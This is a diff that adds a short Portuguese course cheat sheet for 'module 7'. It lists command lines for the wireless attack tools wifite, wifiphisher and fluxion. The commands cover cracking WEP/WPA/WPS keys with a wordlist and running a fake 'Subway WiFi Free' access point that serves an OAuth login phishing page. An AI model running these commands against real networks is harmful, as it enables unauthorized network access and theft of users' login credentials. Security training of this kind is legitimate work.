@@ -1,0 +1,32 @@
+==============================================================
+## COMANDOS QUE UTILIZAMOS NO MÓDULO 7
+==============================================================
+### WIFITE
+airmon-ng check kill
+
+wifite --help
+wifite --wep
+wifite --wpa --wps --dict andre.txt
+
+
+wifite
+  ou
+python /opt/wifite/Wifite.py
+
+==============================================================
+## WIFIPHISHER
+wifiphisher --help
+
+wifiphisher
+
+wifiphisher --noextensions --essid "Subway WiFi Free" -p oauth-login -kB
+
+
+==============================================================
+## FLUXION
+
+./fluxion.sh
+
+./fluxion.sh -i
+
+./fluxion.sh -m -r -k
